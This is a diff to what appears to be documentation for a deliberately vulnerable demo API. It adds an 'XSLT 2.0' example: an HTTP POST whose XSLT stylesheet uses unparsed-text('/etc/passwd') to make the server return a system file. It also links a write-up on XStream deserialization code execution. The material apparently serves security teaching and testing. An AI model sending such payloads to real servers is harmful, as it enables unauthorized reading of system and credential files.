@@ -69,7 +69,23 @@ Accept: application/xml
 </contact>
 ```
 
+## XSLT 2.0
+
+```
+POST /api/contacts/1/html HTTP/1.1
+Host: localhost
+Content-Type: application/xslt
+Accept: text/html
+Content-Length: 241
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+ <xsl:template match="/">
+  <xsl:value-of select="unparsed-text('/etc/passwd')"/>
+ </xsl:template>
+</xsl:stylesheet>
+```
+
+
 # Resources
 http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/
-
-
